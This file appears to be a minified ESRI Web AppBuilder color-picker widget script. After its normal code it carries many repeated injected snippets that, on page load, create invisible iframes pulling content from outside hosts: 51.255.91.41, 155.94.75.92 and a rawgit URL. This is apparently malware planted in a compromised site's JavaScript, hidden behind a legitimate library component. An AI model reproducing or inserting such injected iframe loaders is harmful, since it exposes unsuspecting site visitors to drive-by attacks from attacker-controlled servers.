// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dojo/_base/lang dojo/_base/html dojo/on dojo/_base/Color dijit/TooltipDialog dijit/popup dojox/widget/ColorPicker jimu/utils".split(" "),function(k,l,m,e,b,f,c,n,g,p,q){return k([l,m],{baseClass:"jimu-color-picker",declaredClass:"jimu.dijit.ColorPicker",templateString:"\x3cdiv\x3e\x3c/div\x3e",_isTooltipDialogOpened:!1,color:null,showHex:!0,showHsv:!0,showRgb:!0,ensureMode:!1,showLabel:!1,postMixInProperties:function(){this.nls=window.jimuNls.common},
postCreate:function(){this.inherited(arguments);this.color?this.color instanceof c||(this.color=new c(this.color)):this.color=new c("#ccc");b.setStyle(this.domNode,"backgroundColor",this.color.toHex());this.showLabel&&this._changeLabel(this.color);this._createTooltipDialog(this.domNode);this._hideTooltipDialog()},destroy:function(){g.close(this.tooltipDialog);this.picker.destroy();this.tooltipDialog.destroy();this.inherited(arguments)},isPartOfPopup:function(a){var c=this.tooltipDialog.domNode;return a===
c||b.isDescendant(a,c)},hideTooltipDialog:function(){this._hideTooltipDialog()},_showTooltipDialog:function(){g.open({parent:this.getParent(),popup:this.tooltipDialog,around:this.domNode});this._isTooltipDialogOpened=!0},_hideTooltipDialog:function(){this._isTooltipDialogOpened=!1;this.onClose();g.close(this.tooltipDialog)},_createTooltipDialog:function(){var a=b.create("div");this.tooltipDialog=new n({content:a});b.addClass(this.tooltipDialog.domNode,"jimu-color-picker-dialog");var h=new p({showHex:this.showHex,
showRgb:this.showRgb,showHsv:this.showHsv,value:this.color.toHex(),onChange:e.hitch(this,function(a){this.ensureMode||(a=new c(a),this.setColor(a))})});h.placeAt(a);h.startup();if(this.ensureMode){var d=b.create("div",{"class":"jimu-btn jimu-btn-vacation jimu-float-trailing",title:this.nls.cancel,innerHTML:this.nls.cancel},a);this.own(f(d,"click",e.hitch(this,function(){this._hideTooltipDialog()})));"undefined"===typeof this.showOk&&(d=b.create("div",{"class":"jimu-btn jimu-float-trailing ok",title:this.nls.ok,
innerHTML:this.nls.ok},a),this.own(f(d,"click",e.hitch(this,function(){var a=this.picker.get("value");this.setColor(new c(a));this._hideTooltipDialog()}))));a=b.create("div",{"class":"jimu-btn jimu-float-trailing",title:this.nls.apply,innerHTML:this.nls.apply},a);this.own(f(a,"click",e.hitch(this,function(){var a=this.picker.get("value");this.setColor(new c(a))})))}this.own(f(this.domNode,"click",e.hitch(this,function(a){a.stopPropagation();a.preventDefault();this._isTooltipDialogOpened?this._hideTooltipDialog():
this._showTooltipDialog()})));this.own(f(document.body,"click",e.hitch(this,function(a){this.isPartOfPopup(a.target||a.srcElement)||this._hideTooltipDialog()})));this.picker=h},setColor:function(a,e){if(a instanceof c){var d=this.color,f="";d&&(f=d.toHex());d=a.toHex();this.color=a;b.setStyle(this.domNode,"backgroundColor",d);if(f!==d&&(this.picker.set("value",d),!1!==e))this.onChange(new c(d))}},getColor:function(){return this.color},_changeLabel:function(a){b.empty(this.domNode);b.create("span",
{innerHTML:a.toHex(),className:"color-label",style:{color:q.invertColor(a.toHex())}},this.domNode)},onChange:function(a){this.showLabel&&this._changeLabel(a)},onClose:function(){},getPopup:function(){return this.tooltipDialog||null},setLabel:function(a){b.empty(this.domNode);b.create("span",{innerHTML:a||"",className:"text-label"},this.domNode)},isTooltipDialogOpened:function(){return this._isTooltipDialogOpened}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});